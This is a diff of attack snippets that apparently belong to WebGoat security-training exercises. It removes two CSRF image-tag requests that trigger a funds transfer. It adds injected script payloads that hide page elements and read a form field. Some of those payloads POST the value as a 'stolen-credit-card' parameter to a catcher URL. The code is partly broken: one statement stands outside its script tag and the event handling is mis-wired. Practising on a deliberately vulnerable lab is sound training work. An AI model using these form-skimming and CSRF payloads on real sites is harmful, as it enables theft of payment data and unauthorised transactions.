@@ -1,2 +1,41 @@
-<img src="attack?Screen=1232167937&menu=900&transfer=5000">
-<img src="attack?transfer=CONFIRMED#attack/1232167937/900">
+<script>
+function logSubmit(event) {
+  event.preventDefault();
+  alert("boo");
+}
+const form=document.getElementsByName('form')[0][7];
+form.addEventListener('SUBMIT',logSubmit);
+</script>
+
+if (document.getElementsByName('form')[0][5].value != " "){
+
+myobj2.style.display = "none";
+
+<script>
+var myobj = document.getElementById("message");
+var myobj2 = document.getElementsByName('form')[0][6];
+myobj.style.display = "none";
+function logSubmit() {
+  var val = document.getElementsByName('form')[0][5].value;
+  var xhr=new XMLHttpRequest();
+  var url="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="+val;
+  xhr.open("POST",url,true);
+  xhr.send(null);
+}
+const form=document.getElementsByName('form')[0][7];
+document.getElementsByName('form')[0][6].value = "";
+form.addEventListener('SUBMIT',logSubmit());
+</script>
+
+<script>
+function logSubmit(){
+  alert("boo");
+  var xhr=new XMLHttpRequest();
+  var url="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="+document.getElementsByName("input1").value;
+  xhr.open("POST",url,true);
+  xhr.send(null);}
+
+</script>
+
+<script>alert("boo");</script>
+
